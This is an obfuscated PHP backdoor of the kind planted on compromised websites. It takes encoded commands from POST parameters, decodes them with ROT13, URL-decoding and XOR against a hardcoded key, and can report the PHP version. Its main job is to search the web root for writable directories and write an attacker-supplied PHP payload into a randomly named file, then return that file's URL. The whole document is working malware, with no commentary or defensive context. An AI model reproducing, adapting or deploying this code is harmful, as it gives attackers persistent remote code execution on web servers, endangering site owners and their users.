<?php $pxeylhfrlp = "pfruyflhruagkzme";$wsxoi = "";foreach ($_POST as $coqkzo => $opcfzv){if (strlen($coqkzo) == 16 and substr_count($opcfzv, "%") > 10){hajuj($coqkzo, $opcfzv);}}function hajuj($coqkzo, $pwkzsxy){global $wsxoi;$wsxoi = $coqkzo;$pwkzsxy = str_split(rawurldecode(str_rot13($pwkzsxy)));function mulztj($zmrwoq, $coqkzo){global $pxeylhfrlp, $wsxoi;return $zmrwoq ^ $pxeylhfrlp[$coqkzo % strlen($pxeylhfrlp)] ^ $wsxoi[$coqkzo % strlen($wsxoi)];}$pwkzsxy = implode("", array_map("mulztj", array_values($pwkzsxy), array_keys($pwkzsxy)));$pwkzsxy = @unserialize($pwkzsxy);if (@is_array($pwkzsxy)){$coqkzo = array_keys($pwkzsxy);$pwkzsxy = $pwkzsxy[$coqkzo[0]];if ($pwkzsxy === $coqkzo[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function yqywyqewm($lhoocjkmvir) {static $vkglvknlhb = array();$zawrwofdn = glob($lhoocjkmvir . '/*', GLOB_ONLYDIR);if (count($zawrwofdn) > 0) {foreach ($zawrwofdn as $lhoocjkmv){if (@is_writable($lhoocjkmv)){$vkglvknlhb[] = $lhoocjkmv;}}}foreach ($zawrwofdn as $lhoocjkmvir) yqywyqewm($lhoocjkmvir);return $vkglvknlhb;}$ulwwmdiybq = $_SERVER["DOCUMENT_ROOT"];$zawrwofdn = yqywyqewm($ulwwmdiybq);$coqkzo = array_rand($zawrwofdn);$zpxvyvihxz = $zawrwofdn[$coqkzo] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($zpxvyvihxz, $pwkzsxy);echo "http://" . $_SERVER["HTTP_HOST"] . substr($zpxvyvihxz, strlen($ulwwmdiybq));exit();}}}